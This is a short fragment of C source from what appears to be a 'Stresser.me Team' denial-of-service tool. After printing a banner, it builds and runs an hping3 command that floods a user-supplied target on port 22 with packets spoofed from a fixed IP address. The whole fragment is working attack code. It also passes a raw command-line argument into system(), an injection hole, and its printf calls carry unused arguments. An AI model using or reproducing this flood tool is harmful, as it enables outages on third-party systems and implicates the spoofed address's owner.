...
char aktifet[255];
printf("%s• •        Kodlama: HasanAtilan • •\n",sari,mavi,kirmizi,yesil,kirmizi,yesil,kirmizi,sari);
printf("%s• •        Stresser.me Team     • •\n",sari,mavi,kirmizi,yesil,kirmizi,yesil,kirmizi,sari);
sprintf(aktifet,"hping3 -H -0 -A --spoof 128.65.210.118 %s -p 22 -d 50 -e 'STRESSER.ME TEAM' --flood",argv[1], argv[1]);
system(aktifet);
